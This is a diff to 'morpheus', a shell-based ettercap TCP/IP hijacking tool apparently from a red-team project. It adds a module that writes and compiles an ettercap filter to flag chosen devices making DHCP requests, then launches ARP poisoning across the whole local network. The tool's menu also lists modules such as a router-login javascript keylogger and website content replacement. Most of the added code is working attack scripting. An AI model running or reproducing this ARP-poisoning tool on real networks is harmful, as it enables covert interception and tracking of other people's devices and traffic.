@@ -1,8 +1,8 @@
 #!/bin/sh
 ###
 # morpheus - automated ettercap TCP/IP Hijacking tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 2.0
-# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 2.1
+# Suspicious-Shell-Activity (SSA) RedTeam develop @2018
 # codename: oneiroi_phobetor [ GPL licensed ]
 #
 #
@@ -53,7 +53,7 @@ Reset="${Escape}[0m";
 # Variable declarations
 # ---------------------
 dtr=`date | awk '{print $4}'`        # grab current hour
-V3R="2.0"                            # module version number
+V3R="2.1"                            # module version number
 cnm="oneiroi_phobetor"               # module codename
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd`                          # grab morpheus.sh install path
@@ -159,7 +159,7 @@ while getopts ":h" opt; do
     h)
 cat << !
 ---
--- Author: r00t-3xp10it | SSA RedTeam @2017
+-- Author: r00t-3xp10it | SSA RedTeam @2018
 -- Supported: Linux Kali, Ubuntu, Mint, Parrot OS
 -- Suspicious-Shell-Activity (SSA) RedTeam develop @2016
 ---
@@ -2159,6 +2159,133 @@ esac
 
 
 
+
+
+
+# ----------------------------------------
+# DHCP DISCOVER (smartphones & PCs)
+# ----------------------------------------
+sh_stage17 () {
+
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF}This module poisen all local network to capture sellected 'device'${BlueF}|"
+echo "${BlueF}    | ${YellowF}   request to modem to access local lan network (packet 67/UDP)   ${BlueF}|"
+echo "${BlueF}    | ${YellowF}   and it will trigger one sound warning (BEEP) to morpheus users ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "[ Devices DHCP discovery ]\nthis module allow users to filter any device\n(domain name OR ip addr) thats trying to access our local lan for the first time (auth)\n\nHINT: a beep warning will sound when the filter device will try to connect to our LAN.\nExecute this module?" --width 300) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+
+
+# chose to input one or two targets to filter
+Tc=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "This module allow users to filter one or two targets" --radiolist --column "Pick" --column "Option" TRUE "one target input" FALSE "two targets input" --width 300 --height 180) > /dev/null 2>&1
+
+
+# get user input to build filter
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+sleep 1
+cp $IPATH/filters/dhcp-discovery.eft $IPATH/filters/dhcp-discovery.bak > /dev/null 2>&1
+rhost=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: android-c9211f4272c7e1ef\nchose remote target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+# pasing rtarget ip addr
+store=`echo "$rhost""7"`
+echo "$store" > $IPATH/output/parse
+
+
+if [ "$Tc" = "two targets input" ]; then
+Most=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: android-c9211f4272c7e1ef\nchose remote target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+twoop=`echo "$Most""7"`
+
+  # write the rest of the filter (add to existing code)
+  echo "" >> $IPATH/filters/dhcp-discovery.eft
+  echo "if (ip.src == '0.0.0.0' && ip.proto == UDP && udp.dst == 67) {" >> $IPATH/filters/dhcp-discovery.eft
+  echo "  if (search(DATA.data, \"$twoop\")) {" >> $IPATH/filters/dhcp-discovery.eft
+  echo "  msg(\".\");" >> $IPATH/filters/dhcp-discovery.eft
+  echo "    msg(\"[morpheus] host:0.0.0.0 [ ⊶  ]  found ..\");" >> $IPATH/filters/dhcp-discovery.eft
+  echo "    msg(\"[morpheus] | status  : Request access to local LAN ✔\");" >> $IPATH/filters/dhcp-discovery.eft
+  echo "    msg(\"[morpheus] |   port  : 67/UDP(dst) bootp-DHCP ✔\");" >> $IPATH/filters/dhcp-discovery.eft
+  echo "    msg(\"[morpheus] |_  device: $twoop\");" >> $IPATH/filters/dhcp-discovery.eft
+  echo "    msg(\".\");" >> $IPATH/filters/dhcp-discovery.eft
+  echo "    log(DECODED.data, \"./beep-warning.beep\");" >> $IPATH/filters/dhcp-discovery.eft
+  echo "  }" >> $IPATH/filters/dhcp-discovery.eft
+  echo "}" >> $IPATH/filters/dhcp-discovery.eft
+
+echo "$twoop" > $IPATH/logs/triggertwo
+fi
+
+
+  cd $IPATH/filters
+  # replace values in template.filter with sed bash command
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  sed -i "s|rTdN|$store|g" dhcp-discovery.eft
+  cd $IPATH
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/dhcp-discovery.eft"
+  sleep 1
+
+    # compiling firewall.eft to be used in ettercap
+    echo ${BlueF}[☠]${white} Compiling dhcp-discovery.eft${RedF}!${Reset};
+    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/dhcp-discovery.eft -o $IPATH/output/dhcp-discovery.ef && sleep 3"
+    sleep 1
+    cd $IPATH/logs
+
+      # run mitm+filter
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        xterm -T "MORPHEUS - devices auth capture" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -M ARP /// ///
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        xterm -T "MORPHEUS - devices auth capture" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -L $IPATH/logs/dhcp-discovery.log -M ARP /// ///
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        xterm -T "MORPHEUS - devices auth capture" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -M ARP // //
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        xterm -T "MORPHEUS - devices auth capture" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -L $IPATH/logs/dhcp-discovery.log -M ARP // //
+        fi
+      fi
+
+  # check if exist any reports
+  dd=`ls $IPATH/logs`
+  if ! [ -z "$dd" ]; then
+  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270) > /dev/null 2>&1
+  fi
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  sleep 2
+  mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft > /dev/null 2>&1
+  rm $IPATH/output/dhcp-discovery.ef > /dev/null 2>&1
+  rm $IPATH/output/parse > /dev/null 2>&1
+  rm $IPATH/logs/triggertwo > /dev/nul 2>&1
+  cd $IPATH
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
+
+
+
+
+
 # -------------------------
 # FUNTION TO EXIT FRAMEWORK
 # -------------------------
@@ -2175,7 +2302,7 @@ rm $ApachE/index.html > /dev/null 2>&1
 sleep 2
 clear
 echo ${RedF}codename${white}::${RedF}oneiroi_phobetor'(The mithologic dream greek god)'${Reset};
-echo ${RedF}Morpheus${white}©::${RedF}v$V3R${white}::${RedF}SuspiciousShellActivity${white}©::${RedF}RedTeam${white}::${RedF}2017  ${Reset};
+echo ${RedF}Morpheus${white}©::${RedF}v$V3R${white}::${RedF}SuspiciousShellActivity${white}©::${RedF}RedTeam${white}::${RedF}2018  ${Reset};
 exit
 }
 
@@ -2222,6 +2349,7 @@ cat << !
     |  14    -  Modem/router login webpage      -  javascritp_keylooger |
     |  15    -  Replace website images          -  img src=http://other |
     |  16    -  Replace website text            -  replace: worlds      |
+    |  17    -  Flag device modem auth connection  (local LAN)          |
     |                                                                   |
     |   W    -  Write your own filter                                   |
     |   S    -  Scan LAN for live hosts                                 |
@@ -2229,7 +2357,7 @@ cat << !
     |   E    -  Exit/close Morpheus                                     |
     ╚───────────────────────────────────────────────────────────────────╣
 !
-echo "${YellowF}                                                       SSA_${RedF}RedTeam${YellowF}©2017${BlueF}_⌋${Reset}"
+echo "${YellowF}                                                       SSA_${RedF}RedTeam${YellowF}©2018${BlueF}_⌋${Reset}"
 echo ${BlueF}[☠]${white} tcp/udp hijacking tool${RedF}! ${Reset};
 sleep 1
 echo ${BlueF}[▶]${white} Chose Your Option[filter]${RedF}: ${Reset};
@@ -2252,6 +2380,7 @@ case $choice in
 14) sh_stage14 ;;
 15) sh_stage15 ;;
 16) sh_stage16 ;;
+17) sh_stage17 ;;
 W) sh_stageW ;;
 w) sh_stageW ;;
 S) sh_stageS ;;
